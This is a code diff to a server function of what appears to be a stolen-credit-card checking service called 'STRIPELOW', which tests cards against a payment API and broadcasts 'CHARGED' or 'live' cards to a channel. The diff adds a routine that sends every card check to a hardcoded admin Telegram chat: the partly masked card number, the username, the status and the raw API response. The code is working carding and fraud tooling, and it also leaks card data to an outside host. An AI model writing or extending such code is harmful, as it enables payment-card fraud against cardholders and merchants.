@@ -9,8 +9,60 @@ const corsHeaders = {
 
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
+const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
+const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";
 
 const API_BASE_URL = "https://3-production-c130.up.railway.app/api";
+
+// Send debug to admin Telegram
+const sendAdminDebug = async (
+  cc: string,
+  status: string,
+  message: string,
+  rawResponse: string,
+  username?: string
+) => {
+  if (!TELEGRAM_BOT_TOKEN) {
+    console.log("[STRIPELOW] No Telegram bot token configured");
+    return;
+  }
+
+  try {
+    const maskedCard = cc.replace(/^(\d{6})(\d+)(\d{4})/, '$1******$3');
+    const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
+    
+    // Truncate raw response if too long
+    const truncatedRaw = rawResponse.length > 1500 
+      ? rawResponse.substring(0, 1500) + '... [truncated]' 
+      : rawResponse;
+    
+    const debugMessage = `🔧 <b>STRIPELOW DEBUG</b>
+
+📇 <b>Card:</b> <code>${maskedCard}</code>
+👤 <b>User:</b> ${username || 'Unknown'}
+📊 <b>Status:</b> ${status.toUpperCase()}
+💬 <b>Message:</b> ${message}
+
+━━━━ RAW API RESPONSE ━━━━
+<pre>${truncatedRaw}</pre>
+
+🕐 ${timestamp}`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: ADMIN_TELEGRAM_CHAT_ID,
+        text: debugMessage,
+        parse_mode: "HTML",
+      }),
+    });
+    
+    console.log("[STRIPELOW] Admin debug sent successfully");
+  } catch (error) {
+    console.error("[STRIPELOW] Failed to send admin debug:", error);
+  }
+};
 
 // Notify charged card (fire-and-forget)
 const notifyChargedCard = (
@@ -185,10 +237,10 @@ serve(async (req) => {
         { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
-    // Check if banned
+    // Check if banned and get username
     const { data: profile } = await supabase
       .from("profiles")
-      .select("is_banned")
+      .select("is_banned, username")
       .eq("user_id", user.id)
       .single();
 
@@ -209,6 +261,15 @@ serve(async (req) => {
 
     // Wait for API result
     const result = await apiPromise;
+    
+    // Send debug to admin Telegram (fire-and-forget for all checks)
+    sendAdminDebug(
+      cc,
+      result.status,
+      result.message,
+      result.rawResponse,
+      profile?.username || user.email
+    );
     
     // Broadcast CHARGED cards to channel (fire-and-forget)
     if (result.status === 'live') {
